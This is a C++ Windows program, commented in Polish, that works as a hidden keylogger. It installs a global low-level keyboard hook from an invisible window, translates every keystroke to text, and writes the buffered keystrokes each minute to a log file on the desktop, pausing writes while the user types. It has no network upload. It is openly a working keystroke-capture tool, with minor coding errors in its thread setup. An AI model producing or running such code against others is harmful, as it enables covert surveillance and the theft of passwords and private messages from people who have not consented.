#include <windows.h>
#include <string>
#include <vector>
#include <mutex>
#include <condition_variable>
#include <chrono>
#include <fstream>
#include <sstream>
#include <shlobj.h> 
#include <shlwapi.h>

#pragma comment(lib, "Userenv.lib")
#pragma comment(lib, "Shlwapi.lib")

using namespace std::chrono;

// -------------------------
// Konfiguracja
// -------------------------
static std::vector<std::wstring> g_buffer;
static std::mutex g_mtx;
static std::condition_variable g_cv;

static std::atomic<bool> g_running{ true };
static std::atomic<long long> g_lastKeyTickMs{ 0 };

static constexpr wchar_t kClassName[] = L"HiddenHookWindowClass";
static constexpr wchar_t kWindowName[] = L"HiddenHookWindow";
static HHOOK g_hook = nullptr;
static HWND g_hwnd = nullptr;

static HANDLE g_writerThread = nullptr;
static HANDLE g_idleThread = nullptr;
static DWORD  g_writerTid = 0;
static DWORD  g_idleTid = 0;

static const std::wstring fileName = L"suprise_log.txt";
static const auto kWritePeriod = std::chrono::minutes(1);
static const auto kTypingCooldown = std::chrono::milliseconds(800);  // "user is typing" window
static const auto kIdleThreshold = std::chrono::seconds(3);
static std::wstring outputFile = L"";

std::wstring GetSaveDir()
{
    PWSTR path = nullptr;
    HRESULT hr = SHGetKnownFolderPath(FOLDERID_Desktop, 0, nullptr, &path);
    if (FAILED(hr) || !path) return L"";

    std::wstring result(path);
    CoTaskMemFree(path);
    return result;
}

std::wstring CombinePathWinApi(const std::wstring& dir, const std::wstring& file)
{
    wchar_t buffer[MAX_PATH];
    if (PathCombineW(buffer, dir.c_str(), file.c_str()))
        return buffer;

    return L"";
}

static void InitSaveFile() 
{
    std::wstring path = GetSaveDir();
    outputFile = CombinePathWinApi(path, fileName);
}

static long long NowTickMs()
{
    return static_cast<long long>(GetTickCount64());
}

//Czy u¿ytkownik pisze na klawiaturze
static bool IsUserTyping()
{
    long long last = g_lastKeyTickMs.load(std::memory_order_relaxed);
    long long now = NowTickMs();
    return (now - last) <= static_cast<long long>(duration_cast<milliseconds>(kTypingCooldown).count());
}

//Doddawanie do bufora
static void BufferPush(std::wstring s)
{
    {
        std::lock_guard<std::mutex> lk(g_mtx);
        g_buffer.push_back(std::move(s));
    }
    g_cv.notify_all();
}

// Zapisanie bufora do pliku
static void FlushBufferToFile()
{
    std::vector<std::wstring> snapshot;

    {
        std::lock_guard<std::mutex> lk(g_mtx);
        snapshot.swap(g_buffer);
    }

    if (snapshot.empty())
        return;

    std::wofstream out(outputFile, std::ios::app);
    if (!out.is_open())
        return;

    SYSTEMTIME st;
    GetLocalTime(&st);

    out << L""
        << st.wYear << L"-" << st.wMonth << L"-" << st.wDay << L" "
        << st.wHour << L":" << st.wMinute << L":" << st.wSecond
        << L" ----\n";

    for (auto& line : snapshot)
        out << line;

    out << L"\n";
}

// ----------------------------
// W¹tek: zapis do pliku
// ----------------------------
static DWORD WINAPI WriterThreadProc(LPVOID)
{
    auto next = steady_clock::now() + kWritePeriod;

    std::unique_lock<std::mutex> lk(g_mtx);
    while (g_running.load())
    {
        g_cv.wait_until(lk, next, [] {
            return !g_running.load();
        });

        if (!g_running.load())
            break;

        auto now = steady_clock::now();
        if (now < next)
            continue;

        while (g_running.load() && IsUserTyping())
        {
            g_cv.wait_for(lk, std::chrono::milliseconds(100), [] {
                return !g_running.load();
            });
        }

        if (!g_running.load())
            break;

        lk.unlock();
        FlushBufferToFile();
        lk.lock();

        next = steady_clock::now() + kWritePeriod;
    }

    return 0;
}

// ----------------------------
// W¹tek: dodaje bia³e znaki do bufora jak u¿ytkownik nic nie robi
// ----------------------------
static DWORD WINAPI IdleThreadProc(LPVOID)
{
    std::unique_lock<std::mutex> lk(g_mtx);

    while (g_running.load())
    {
        g_cv.wait_for(lk, std::chrono::milliseconds(200), [] {
            return !g_running.load();
        });

        if (!g_running.load())
            break;

        long long now = NowTickMs();
        long long last = g_lastKeyTickMs.load(std::memory_order_relaxed);

        auto idleMs = now - last;
        if (idleMs >= static_cast<long long>(duration_cast<milliseconds>(kIdleThreshold).count()))
        {
            g_buffer.push_back(L"    "); // 4 spacje
            g_lastKeyTickMs.store(now, std::memory_order_relaxed);
            g_cv.notify_all();
        }
    }

    return 0;
}

static bool CreateThreads()
{
    g_lastKeyTickMs.store(NowTickMs(), std::memory_order_relaxed);

    g_running.store(true);

    g_writerThread = CreateThread(nullptr, 0, WriterThreadProc, nullptr, 0, &g_writerTid);
    g_idleThread = CreateThread(nullptr, 0, IdleThreadProc, nullptr, 0, &g_idleTid);

    if (!g_writerThread || !g_idleThread)
    {
        BufferPush(L"CreateThread failed.");
        return -1;
    }
}

static bool CloseThreads()
{
    g_running.store(false);
    g_cv.notify_all();

    HANDLE handles[2] = { g_writerThread, g_idleThread };
    for (auto h : handles)
    {
        if (h)
            WaitForSingleObject(h, 3000);
    }

    if (g_writerThread) { CloseHandle(g_writerThread); g_writerThread = nullptr; }
    if (g_idleThread) { CloseHandle(g_idleThread);   g_idleThread = nullptr; }

    return true;
}

//Na potrzeby debugowania
static void DebugLog(const std::wstring& msg)
{
    OutputDebugStringW((msg + L"\n").c_str());
}

static void SetKeyDown(BYTE ks[256], int vk, bool down)
{
    if (down) ks[vk] |= 0x80;
    else      ks[vk] &= ~0x80;
}

static void SetKeyToggled(BYTE ks[256], int vk, bool toggled)
{
    if (toggled) ks[vk] |= 0x01;
    else         ks[vk] &= ~0x01;
}

std::wstring VkCodeToUnicode(
    DWORD vkCode,
    DWORD scanCode,
    bool shift,
    bool capsLock,
    bool rightAlt // AltGr
)
{
    BYTE keyboardState[256]{};
    if (!GetKeyboardState(keyboardState))
        return L"";

    HKL layout = GetKeyboardLayout(0);

    if (scanCode == 0)
        scanCode = MapVirtualKeyEx(vkCode, MAPVK_VK_TO_VSC, layout);

    // Shift
    SetKeyDown(keyboardState, VK_SHIFT, shift);
    SetKeyDown(keyboardState, VK_LSHIFT, shift);
    SetKeyDown(keyboardState, VK_RSHIFT, shift);

    // CapsLock
    SetKeyToggled(keyboardState, VK_CAPITAL, capsLock);

    // Prawy Alt (AltGr)
    // Windows czêsto interpretuje AltGr jako RAlt + LCtrl.
    SetKeyDown(keyboardState, VK_RMENU, rightAlt);
    SetKeyDown(keyboardState, VK_MENU, rightAlt);      // czasem pomaga dla czêœci layoutów

    if (rightAlt)
    {
        // Symuluj Ctrl dla AltGr (kluczowe na wielu layoutach)
        SetKeyDown(keyboardState, VK_CONTROL, true);
        SetKeyDown(keyboardState, VK_LCONTROL, true);
    }

    WCHAR buffer[16]{};
    UINT flags = 0;

    int rc = ToUnicodeEx(
        vkCode,
        scanCode,
        keyboardState,
        buffer,
        (int)(std::size(buffer) - 1),
        flags,
        layout
    );

    if (rc == -1)
    {
        //czyœcimy stan
        WCHAR dummy[16]{};
        ToUnicodeEx(vkCode, scanCode, keyboardState, dummy, (int)(std::size(dummy) - 1), flags, layout);
        return L"";
    }

    if (rc > 0)
        return std::wstring(buffer, rc);

    return L"";
}

// -------------------------
// Hook proc
// -------------------------
static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION)
    {
        auto* kb = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
        {
            g_lastKeyTickMs.store(NowTickMs(), std::memory_order_relaxed);
            // Zamkniêcie aplikacji: Ctrl + Shift + Q

            const bool ctrl = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
            const bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
            const bool capsLock = (GetAsyncKeyState(VK_CAPITAL) & 0x8000) != 0;
            const bool rAlt = (GetAsyncKeyState(VK_RMENU) & 0x8000) != 0;

            if (ctrl && shift && kb->vkCode == 'Q')
            {
                DebugLog(L"[hook] Ctrl+Shift+Q -> exiting");
                if (g_hwnd)
                    PostMessageW(g_hwnd, WM_CLOSE, 0, 0);
                return 1; 
            }

            std::wstring ch = VkCodeToUnicode(kb->vkCode, kb->scanCode, shift, capsLock, rAlt);
            
            if (!ch.empty())
            {
                BufferPush(ch);
                OutputDebugStringW((L"Char: " + ch + L"\n").c_str());
            }
        }
    }

    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

// -------------------------
// Instalacja hooka
// -------------------------
static bool InstallHook()
{
    HINSTANCE hInst = GetModuleHandleW(nullptr);

    g_hook = SetWindowsHookExW(
        WH_KEYBOARD_LL,
        LowLevelKeyboardProc,
        hInst,
        0
    );

    if (!g_hook)
    {
        DebugLog(L"[hook] SetWindowsHookExW failed, err=" + std::to_wstring(GetLastError()));
        return false;
    }

    DebugLog(L"[hook] Installed WH_KEYBOARD_LL");
    return true;
}

static void UninstallHook()
{
    if (g_hook)
    {
        UnhookWindowsHookEx(g_hook);
        g_hook = nullptr;
        DebugLog(L"[hook] Uninstalled");
    }
}

// -------------------------
// WndProc (ukryte okno)
// -------------------------
static LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    switch (msg)
    {
        case WM_CREATE:        
        InitSaveFile();
        // instalujemy hook po utworzeniu okna
        InstallHook();
        CreateThreads();
        BufferPush(L"App started. \n");
        return 0;

        case WM_CLOSE:
        DestroyWindow(hwnd);
        return 0;

        case WM_DESTROY:
        CloseThreads();
        UninstallHook();
        
        // Final flush
        FlushBufferToFile();

        PostQuitMessage(0);
        return 0;
    }

    return DefWindowProcW(hwnd, msg, wParam, lParam);
}

// -------------------------
// WinMain
// -------------------------
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR, int)
{
    // Rejestracja klasy okna
    WNDCLASSEXW wc{};
    wc.cbSize = sizeof(wc);
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = kClassName;

    if (!RegisterClassExW(&wc))
        return 1;

    // Tworzymy okno ukryte (bez WS_VISIBLE)
    g_hwnd = CreateWindowExW(
        0,
        kClassName,
        kWindowName,
        WS_OVERLAPPEDWINDOW, // styl okna (nie bêdzie widoczne, bo nie robimy ShowWindow)
        CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
        nullptr,
        nullptr,
        hInstance,
        nullptr
    );

    if (!g_hwnd)
        return 2;

    // Nie wywo³ujemy ShowWindow/UpdateWindow -> okno pozostaje niewidoczne

    DebugLog(L"[app] Running hidden. Press Ctrl+Shift+Q to exit.");
    
    MSG msg;
    while (GetMessageW(&msg, nullptr, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    return 0;
}
